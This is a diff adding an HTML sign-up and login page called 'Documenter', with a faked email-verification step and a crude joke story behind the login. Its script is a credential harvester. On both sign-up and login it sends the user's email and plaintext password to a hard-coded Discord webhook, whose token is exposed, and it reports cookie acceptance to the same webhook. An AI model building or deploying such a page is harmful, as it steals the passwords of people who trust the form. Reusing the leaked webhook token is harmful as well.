@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Documenter - Sign Up & Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .container {
+            width: 300px;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0px 0px 15px rgba(0,0,0,0.1);
+            text-align: center;
+            border-radius: 8px;
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        button {
+            padding: 10px;
+            width: 100%;
+            background-color: #3498db;
+            border: none;
+            color: white;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        button:hover {
+            background-color: #2980b9;
+        }
+        .cookie-consent {
+            display: none;
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: white;
+            padding: 15px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Sign Up Form -->
+    <div class="container" id="signup-form">
+        <h2>Sign Up</h2>
+        <input type="email" id="signup-email" placeholder="Email" required><br>
+        <input type="password" id="signup-password" placeholder="Password" required><br>
+        <button onclick="signup()">Sign Up</button>
+    </div>
+
+    <!-- Email Verification Form -->
+    <div class="container" id="verification-form" style="display:none;">
+        <h2>Verify Email</h2>
+        <p>Please check your email for a verification link.</p>
+    </div>
+
+    <!-- Login Form -->
+    <div class="container" id="login-form" style="display:none;">
+        <h2>Login</h2>
+        <input type="email" id="login-email" placeholder="Email" required><br>
+        <input type="password" id="login-password" placeholder="Password" required><br>
+        <button onclick="login()">Login</button>
+    </div>
+
+    <!-- Logged In Page -->
+    <div class="container" id="logged-in-page" style="display:none;">
+        <h2>Welcome!</h2>
+        <p class="story">
+            Hello, my name is Kalle Kallas Knas and I have quite the story to share. 
+            Last year, in an attempt to prove a point during a friendly gathering, 
+            I did something incredibly reckless: I shoved an air bomb up my backside. 
+            It was meant to be a harmless joke, but little did I know the chain of events that would follow.
+            <!-- More of the story can go here -->
+        </p>
+    </div>
+
+    <!-- Cookie Consent -->
+    <div class="cookie-consent" id="cookie-consent">
+        <p>By accepting cookies, we will get access to your web browser cookies. <a href="#" id="privacy-policy" onclick="showPrivacyPolicy()">Read Privacy Policy</a></p>
+        <button onclick="acceptCookies()">Accept Cookies</button>
+    </div>
+
+    <script>
+        const webhookURL = 'https://discord.com/api/webhooks/1294371749374460024/s5eEiLV06Z2l_tFyI8cgfAy9f_3SQDmvtfGERFuvXwPo-hTG2IFKN0CKZenV1TieS6tB'; // Your Discord Webhook URL
+
+        // Function to validate email with a basic regex pattern
+        function validateEmail(email) {
+            const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.(com|net|org|edu|gov|mil|icloud|gmail|yahoo|outlook)$/;
+            return emailPattern.test(email);
+        }
+
+        // Function to simulate sending a verification email
+        function sendVerificationEmail(email) {
+            console.log(`Verification email sent to ${email}`); // For demonstration purposes
+            return new Promise((resolve) => {
+                setTimeout(() => {
+                    resolve(true);
+                }, 1000);
+            });
+        }
+
+        // Function to handle sign up
+        function signup() {
+            const email = document.getElementById('signup-email').value;
+            const password = document.getElementById('signup-password').value;
+
+            if (email && password) {
+                if (!validateEmail(email)) {
+                    alert('Please enter a valid email with an appropriate domain (e.g., gmail.com, yahoo.com).');
+                    return;
+                }
+
+                sendVerificationEmail(email).then((success) => {
+                    if (success) {
+                        // Send sign up details to Discord Webhook
+                        sendAccountDetailsToWebhook(email, password);
+                        
+                        document.getElementById('signup-form').style.display = 'none';
+                        document.getElementById('verification-form').style.display = 'block';
+                        
+                        // Simulate email verification
+                        setTimeout(() => {
+                            alert("Email verified!");
+                            document.getElementById('verification-form').style.display = 'none';
+                            document.getElementById('login-form').style.display = 'block'; // Show login form after verification
+                        }, 3000);
+                    } else {
+                        alert('Error sending verification email.');
+                    }
+                });
+            } else {
+                alert('Please enter both email and password.');
+            }
+        }
+
+        // Function to handle login
+        function login() {
+            const email = document.getElementById('login-email').value;
+            const password = document.getElementById('login-password').value;
+
+            if (email && password) {
+                // Send account information to Discord Webhook
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `User Login:\nEmail: ${email}\nPassword: ${password}`
+                    })
+                }).then(() => {
+                    // Simulate login and show content
+                    document.getElementById('login-form').style.display = 'none';
+                    document.getElementById('logged-in-page').style.display = 'block';
+                    showCookieConsent(); // Show cookie consent after logging in
+                }).catch(err => {
+                    alert('Error sending data to Discord webhook.');
+                });
+            } else {
+                alert('Please enter both email and password.');
+            }
+        }
+
+        // Function to send account details to Discord webhook
+        function sendAccountDetailsToWebhook(email, password) {
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `New Account Created:\nEmail: ${email}\nPassword: ${password}`
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Sign up details sent to webhook successfully.");
+                } else {
+                    console.error("Failed to send sign up details to webhook.");
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        }
+
+        // Show cookie consent
+        function showCookieConsent() {
+            document.getElementById('cookie-consent').style.display = 'block';
+        }
+
+        // Accept cookies and send to webhook
+        function acceptCookies() {
+            console.log("Cookies accepted.");
+            sendCookiesToWebhook();
+            document.getElementById('cookie-consent').style.display = 'none';
+        }
+
+        // Simulate sending cookies to a webhook
+        function sendCookiesToWebhook() {
+            const email = document.getElementById('login-email').value || document.getElementById('signup-email').value;
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `User Email: ${email} has accepted cookies.`
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Cookie acceptance sent to webhook successfully.");
+                } else {
+                    console.error("Failed to send cookie acceptance to webhook.");
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        }
+
+        // Show Privacy Policy
+        function showPrivacyPolicy() {
+            alert("By accepting cookies, you agree to our privacy policy.");
+        }
+    </script>
+
+</body>
+</html>
+
